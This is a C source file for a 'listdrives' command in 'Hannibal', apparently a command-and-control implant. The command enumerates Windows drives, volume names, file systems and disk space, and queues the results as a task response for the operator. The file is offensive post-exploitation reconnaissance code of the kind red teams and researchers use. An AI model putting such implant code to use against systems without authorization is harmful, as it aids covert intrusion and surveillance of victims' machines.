#include "config.h"


#ifdef INCLUDE_CMD_LISTDRIVES

#include "hannibal_tasking.h"

SECTION_CODE void cmd_listdrives(TASK t) 
{
    HANNIBAL_INSTANCE_PTR

    CMD_LISTDRIVES *ld = (CMD_LISTDRIVES *)t.cmd;


    size_t INITIAL_BUFFER_SIZE = 4096;
    size_t CURRENT_BUFFER_SIZE = INITIAL_BUFFER_SIZE;
    size_t CURRENT_BUFFER_USAGE = 0;

    UINT8 *response_content = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, INITIAL_BUFFER_SIZE);
    
    DWORD drives = hannibal_instance_ptr->Win32.GetLogicalDrives(); // Get a bitmask of the drives
    WCHAR volume_name[MAX_PATH];
    WCHAR file_system_name[MAX_PATH];
    DWORD volume_serial_number, maximum_component_length, file_system_flags;

    // Iterate through the bitmask of drives
    for (WCHAR letter = L'A'; letter <= L'Z'; letter++) {
        if (drives & (1 << (letter - L'A'))) { // Check if the drive is available
            WCHAR drive_letter[4] = { letter, L':', L'\\', L'\0' };

            // Get volume information
            if (hannibal_instance_ptr->Win32.GetVolumeInformationW(
                                        drive_letter,
                                        volume_name,
                                        sizeof(volume_name) / sizeof(WCHAR),
                                        &volume_serial_number,
                                        &maximum_component_length,
                                        &file_system_flags,
                                        file_system_name,
                                        sizeof(file_system_name) / sizeof(WCHAR))) {

                // Append drive letter information
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, drive_letter);
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, volume_name);
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, file_system_name);
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

            }

            ULARGE_INTEGER free_bytes_available, total_number_of_bytes, total_number_of_free_bytes;
            if (hannibal_instance_ptr->Win32.GetDiskFreeSpaceExW(drive_letter,
                                        &free_bytes_available,
                                        &total_number_of_bytes,
                                        &total_number_of_free_bytes)) {

                ULONG64 total_size_mb = total_number_of_bytes.QuadPart / (1024 * 1024);
                ULONG64 free_space_mb = total_number_of_free_bytes.QuadPart / (1024 * 1024);
                // ULONG64 used_space_mb = (total_number_of_bytes.QuadPart - total_number_of_free_bytes.QuadPart) / (1024 * 1024);

                WCHAR total_size_str[20], free_space_str[20], used_space_str[20];

                ulong_to_wchar(total_size_mb, total_size_str);
                ulong_to_wchar(free_space_mb, free_space_str);
                // ulong_to_wchar(used_space_mb, used_space_str);

                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"Free: ");
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, free_space_str);
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L" MB\n");
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"Total: ");
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, total_size_str);
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L" MB\n");
                buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");
            }
        }
    }

    TASK response_t;
    response_t.output = (LPCSTR)response_content;
    response_t.output_size = CURRENT_BUFFER_USAGE;
    response_t.task_uuid = t.task_uuid;

    task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
}

#endif